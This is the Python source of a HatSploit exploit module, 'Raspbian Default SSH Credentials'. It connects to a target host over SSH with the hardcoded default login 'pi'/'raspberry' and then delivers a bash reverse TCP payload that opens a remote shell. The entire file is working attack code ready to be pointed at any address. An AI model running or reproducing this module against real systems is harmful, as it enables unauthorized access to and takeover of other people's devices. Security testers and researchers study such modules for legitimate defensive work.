#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from pex.proto.ssh import SSHClient
from hatsploit.lib.handler import Handler


class HatSploitModule(Module, SSHClient, Handler):
    details = {
        'Category': "exploit",
        'Name': "Raspbian Default SSH Credentials",
        'Module': "exploit/linux/ssh/raspbian_default_credentials",
        'Authors': ['Ivan Nikolsky (enty8080) - module developer'],
        'Description': "Bypass Raspberry PI SSH authorization using Raspbian default SSH password.",
        'Platform': "linux",
        'Rank': "medium",
    }

    payload = {
        'Value': "unix/generic/bash_reverse_tcp",
        'Architectures': ['armle', 'aarch64', 'generic'],
        'Platforms': ['linux', 'unix'],
        'Types': None,
    }

    options = {
        'HOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True,
        },
        'PORT': {
            'Description': "Remote port.",
            'Value': 22,
            'Type': "port",
            'Required': True,
        },
    }

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.print_process(f"Exploiting {remote_host}...")
        client = self.open_ssh(remote_host, remote_port, 'pi', 'raspberry')

        client.connect()

        self.module_handle(host=remote_host, sender=client.send_command)

        client.disconnect()
